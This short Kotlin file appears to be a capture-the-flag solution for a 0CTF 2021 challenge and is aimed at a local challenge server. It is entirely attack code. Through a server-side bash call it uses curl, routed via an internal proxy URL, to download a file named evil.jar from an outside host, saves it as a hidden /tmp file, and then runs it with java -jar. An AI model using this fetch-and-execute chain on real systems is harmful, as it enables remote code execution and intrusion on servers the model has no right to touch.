package soln

fun main(): Unit = with(Soln("http://localhost:30050")) {
    downloadJar()
    clientGetFlag()
}

private fun Soln.downloadJar() {
    serverBash("curl -so /tmp/.ccl.jar http://spider:8080/?url=https://tmp.ceclin.top/0ctf-2021-2rm1/evil.jar")
    println("sleep 3s to wait for jar downloading")
    Thread.sleep(1000 * 3)
}

private fun Soln.clientGetFlag() = serverBash("java -jar /tmp/.ccl.jar")
